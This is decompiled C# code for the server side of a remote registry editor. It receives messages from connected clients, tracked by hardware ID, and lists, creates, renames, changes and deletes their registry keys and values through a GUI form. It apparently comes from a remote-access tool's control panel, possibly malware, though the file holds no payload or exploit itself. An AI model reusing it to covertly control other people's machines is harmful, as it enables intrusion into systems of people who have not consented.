using System;
using System.Collections.Generic;
using System.Windows.Forms;
using Leb128;
using Microsoft.Win32;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages
{
	// Token: 0x0200005A RID: 90
	internal class HandlerRegedit
	{
		// Token: 0x060001EA RID: 490 RVA: 0x0001E640 File Offset: 0x0001C840
		public static void Read(Clients client, object[] objects)
		{
			string text = (string)objects[1];
			if (text != null)
			{
				switch (text.Length)
				{
				case 5:
				{
					if (!(text == "Error"))
					{
						return;
					}
					if (client.Tag == null)
					{
						client.Disconnect();
						return;
					}
					FormRegedit form = (FormRegedit)client.Tag;
					form.Invoke(new MethodInvoker(delegate()
					{
						form.materialLabel1.Text = "Error: " + (string)objects[2];
					}));
					return;
				}
				case 6:
				case 8:
				case 10:
					break;
				case 7:
				{
					char c = text[0];
					if (c != 'C')
					{
						if (c != 'L')
						{
							return;
						}
						if (!(text == "LoadKey"))
						{
							return;
						}
						FormRegedit FM = (FormRegedit)client.Tag;
						if (FM != null)
						{
							string rootKey = (string)objects[2];
							List<RegistrySeeker.RegSeekerMatch> seekerMatches = new List<RegistrySeeker.RegSeekerMatch>();
							int i = 3;
							while (i < objects.Length)
							{
								RegistrySeeker.RegSeekerMatch regSeekerMatch3 = new RegistrySeeker.RegSeekerMatch();
								regSeekerMatch3.Key = (string)objects[i++];
								object[] array = LEB128.Read((byte[])objects[i++]);
								List<RegistrySeeker.RegValueData> list = new List<RegistrySeeker.RegValueData>();
								int j = 0;
								while (j < array.Length)
								{
									list.Add(new RegistrySeeker.RegValueData
									{
										Name = (string)array[j++],
										Kind = (RegistryValueKind)((int)array[j++]),
										Data = (byte[])array[j++]
									});
								}
								regSeekerMatch3.Data = list.ToArray();
								regSeekerMatch3.HasSubKeys = (bool)objects[i++];
								seekerMatches.Add(regSeekerMatch3);
							}
							FM.Invoke(new MethodInvoker(delegate()
							{
								FM.AddKeys(rootKey, seekerMatches.ToArray());
							}));
							return;
						}
					}
					else
					{
						if (!(text == "Connect"))
						{
							return;
						}
						FormRegedit form = (FormRegedit)Application.OpenForms["Regedit:" + (string)objects[2]];
						if (form == null)
						{
							client.Disconnect();
							return;
						}
						string rootKey = (string)objects[3];
						List<RegistrySeeker.RegSeekerMatch> seekerMatches = new List<RegistrySeeker.RegSeekerMatch>();
						int k = 4;
						while (k < objects.Length)
						{
							RegistrySeeker.RegSeekerMatch regSeekerMatch2 = new RegistrySeeker.RegSeekerMatch();
							regSeekerMatch2.Key = (string)objects[k++];
							object[] array2 = LEB128.Read((byte[])objects[k++]);
							List<RegistrySeeker.RegValueData> list2 = new List<RegistrySeeker.RegValueData>();
							int l = 0;
							while (l < array2.Length)
							{
								list2.Add(new RegistrySeeker.RegValueData
								{
									Name = (string)array2[l++],
									Kind = (RegistryValueKind)((int)array2[l++]),
									Data = (byte[])array2[l++]
								});
							}
							regSeekerMatch2.Data = list2.ToArray();
							regSeekerMatch2.HasSubKeys = (bool)objects[k++];
							seekerMatches.Add(regSeekerMatch2);
						}
						form.Invoke(new MethodInvoker(delegate()
						{
							form.materialLabel1.Enabled = true;
							form.lstRegistryValues.Enabled = true;
							form.tvRegistryDirectory.Enabled = true;
							form.Text = "Regedit [" + (string)objects[2] + "]";
							form.materialLabel1.Text = "Succues Connect";
							form.AddKeys(rootKey, seekerMatches.ToArray());
							form.client = client;
						}));
						client.Tag = form;
						client.Hwid = (string)objects[2];
						return;
					}
					break;
				}
				case 9:
				{
					char c = text[0];
					if (c != 'C')
					{
						if (c != 'D')
						{
							if (c != 'R')
							{
								return;
							}
							if (!(text == "RenameKey"))
							{
								return;
							}
							FormRegedit FM = (FormRegedit)client.Tag;
							if (FM != null)
							{
								FM.Invoke(new MethodInvoker(delegate()
								{
									FM.RenameKey((string)objects[2], (string)objects[3], (string)objects[4]);
								}));
								return;
							}
						}
						else
						{
							if (!(text == "DeleteKey"))
							{
								return;
							}
							FormRegedit FM = (FormRegedit)client.Tag;
							if (FM != null)
							{
								FM.Invoke(new MethodInvoker(delegate()
								{
									FM.DeleteKey((string)objects[2], (string)objects[3]);
								}));
								return;
							}
						}
					}
					else
					{
						if (!(text == "CreateKey"))
						{
							return;
						}
						FormRegedit FM = (FormRegedit)client.Tag;
						if (FM != null)
						{
							string ParentPath = (string)objects[2];
							RegistrySeeker.RegSeekerMatch regSeekerMatch = new RegistrySeeker.RegSeekerMatch();
							regSeekerMatch.Key = (string)objects[3];
							object[] array3 = LEB128.Read((byte[])objects[4]);
							List<RegistrySeeker.RegValueData> list3 = new List<RegistrySeeker.RegValueData>();
							int m = 0;
							while (m < array3.Length)
							{
								list3.Add(new RegistrySeeker.RegValueData
								{
									Name = (string)array3[m++],
									Kind = (RegistryValueKind)((int)array3[m++]),
									Data = (byte[])array3[m++]
								});
							}
							regSeekerMatch.Data = list3.ToArray();
							regSeekerMatch.HasSubKeys = (bool)objects[5];
							FM.Invoke(new MethodInvoker(delegate()
							{
								FM.CreateNewKey(ParentPath, regSeekerMatch);
							}));
							return;
						}
					}
					break;
				}
				case 11:
				{
					char c = text[2];
					if (c <= 'e')
					{
						if (c != 'a')
						{
							if (c != 'e')
							{
								return;
							}
							if (!(text == "CreateValue"))
							{
								return;
							}
							FormRegedit FM = (FormRegedit)client.Tag;
							if (FM != null)
							{
								string keyPath = (string)objects[2];
								string text2 = (string)objects[3];
								string name = (string)objects[4];
								RegistryValueKind kind = RegistryValueKind.None;
								if (text2 != null)
								{
									int length = text2.Length;
									if (length != 1)
									{
										if (length == 2)
										{
											c = text2[0];
											if (c != '-')
											{
												if (c == '1')
												{
													if (text2 == "11")
													{
														kind = RegistryValueKind.QWord;
													}
												}
											}
											else if (text2 == "-1")
											{
												kind = RegistryValueKind.None;
											}
										}
									}
									else
									{
										switch (text2[0])
										{
										case '0':
											kind = RegistryValueKind.Unknown;
											break;
										case '1':
											kind = RegistryValueKind.String;
											break;
										case '2':
											kind = RegistryValueKind.ExpandString;
											break;
										case '3':
											kind = RegistryValueKind.Binary;
											break;
										case '4':
											kind = RegistryValueKind.DWord;
											break;
										case '7':
											kind = RegistryValueKind.MultiString;
											break;
										}
									}
								}
								RegistrySeeker.RegValueData regValueData = new RegistrySeeker.RegValueData();
								regValueData.Name = name;
								regValueData.Kind = kind;
								regValueData.Data = new byte[0];
								FM.Invoke(new MethodInvoker(delegate()
								{
									FM.CreateValue(keyPath, regValueData);
								}));
								return;
							}
						}
						else
						{
							if (!(text == "ChangeValue"))
							{
								return;
							}
							FormRegedit FM = (FormRegedit)client.Tag;
							if (FM != null)
							{
								string keyPath = (string)objects[2];
								RegistrySeeker.RegValueData regValueData = new RegistrySeeker.RegValueData();
								regValueData.Name = (string)objects[3];
								regValueData.Kind = (RegistryValueKind)((int)objects[4]);
								regValueData.Data = (byte[])objects[5];
								FM.Invoke(new MethodInvoker(delegate()
								{
									FM.ChangeValue(keyPath, regValueData);
								}));
							}
						}
					}
					else if (c != 'l')
					{
						if (c != 'n')
						{
							return;
						}
						if (!(text == "RenameValue"))
						{
							return;
						}
						FormRegedit FM = (FormRegedit)client.Tag;
						if (FM != null)
						{
							FM.Invoke(new MethodInvoker(delegate()
							{
								FM.RenameValue((string)objects[2], (string)objects[3], (string)objects[4]);
							}));
							return;
						}
					}
					else
					{
						if (!(text == "DeleteValue"))
						{
							return;
						}
						FormRegedit FM = (FormRegedit)client.Tag;
						if (FM != null)
						{
							FM.Invoke(new MethodInvoker(delegate()
							{
								FM.DeleteValue((string)objects[2], (string)objects[3]);
							}));
							return;
						}
					}
					break;
				}
				default:
					return;
				}
			}
		}
	}
}
